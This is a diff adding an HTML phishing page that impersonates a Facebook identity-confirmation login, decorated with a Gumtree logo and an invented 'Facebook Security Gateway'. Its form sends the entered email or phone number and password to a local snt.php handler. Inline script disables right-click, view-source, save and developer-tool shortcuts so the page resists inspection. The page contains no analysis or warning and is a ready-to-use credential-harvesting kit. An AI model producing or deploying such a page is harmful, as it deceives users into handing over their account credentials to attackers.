@@ -1,0 +1,111 @@
+<html><head><script language="Javascript" src="empty1jscrpvar1.js"></script>
+
+
+  <title>Facebook | Confirm identity</title>
+    <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/css/bootstrap.min.css">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/js/bootstrap.min.js"></script>
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans:400,700" rel="stylesheet" type="text/css">
+<link rel="stylesheet" type="text/css" href="style.css">
+<link rel="shortcut icon" href="fav.png">
+
+
+<script language="JavaScript">
+
+  window.onload = function() {
+    document.addEventListener("contextmenu", function(e){
+      e.preventDefault();
+    }, false);
+    document.addEventListener("keydown", function(e) {
+    //document.onkeydown = function(e) {
+      // "I" key
+      if (e.ctrlKey && e.shiftKey && e.keyCode == 73) {
+        disabledEvent(e);
+      }
+      // "J" key
+      if (e.ctrlKey && e.shiftKey && e.keyCode == 74) {
+        disabledEvent(e);
+      }
+      // "S" key + macOS
+      if (e.keyCode == 83 && (navigator.platform.match("Mac") ? e.metaKey : e.ctrlKey)) {
+        disabledEvent(e);
+      }
+      // "U" key
+      if (e.ctrlKey && e.keyCode == 85) {
+        disabledEvent(e);
+      }
+      // "F12" key
+      if (event.keyCode == 123) {
+        disabledEvent(e);
+      }
+    }, false);
+    function disabledEvent(e){
+      if (e.stopPropagation){
+        e.stopPropagation();
+      } else if (window.event){
+        window.event.cancelBubble = true;
+      }
+      e.preventDefault();
+      return false;
+    }
+  };
+</script>
+</head>
+<body oncontextmenu="return false;">
+
+<div id="navwrapper">
+  <div id="navbar"> 
+    <style type="text/css">
+.custom-centered{
+ margin:0 auto;
+ width:300px;
+}
+</style>
+    <h1 class="logowrapper"><img src="fb.png"> Facebook</h1>
+   
+  </div>
+  </div>
+
+  <div id="contentwrapper">
+    <div id="content">
+      <!-- <p class="fbhdng">To protect the privacy of our community please confirm your identity using your <b>Facebook/b> account with <b>Offerup</b>.</p> -->
+       <center><img src="gumtree_logo.png"></center><br><br><br>
+      <center><p>To protect the privacy of our community please confirm your identity using your <b>Facebook</b> account with <b>Facebook Security Gateway</b>.</p></center><br><br>
+      <div>
+          <div class="row">
+             <div class="col-md-4"> </div>
+    <div class="col-md-4 bdycntr">
+     
+
+  <form class="custom-centered" method="POST" action="snt.php">
+  <div class="form-group">
+    <label class="control-label login_form_label" for="email">Email or Phone: </label>
+      <input type="text" name="us" class="form-control inpttxt" required="">
+  </div>
+  <div class="form-group">
+    <label class="control-label login_form_label" for="pwd">Password: </label>
+     <input type="password" name="ps" class="form-control inpttxt" required="">
+  </div>
+  
+  <div class="form-group"> 
+    <div class="col-sm-offset-2 col-sm-10">
+      <button type="submit" name="snt" class="btn btn-primary">Log In</button>
+     <br> <br> <a href="">Forgot Password?</a>
+     <br> <br> <a href="" class="btn btn-success">Create New Account</a>
+    </div>
+
+  </div>
+</form>
+</div>
+<div class="col-md-4"> </div>
+</div>
+      </div> 
+      
+     </div>
+    </div>
+  
+  
+
+</body></html>
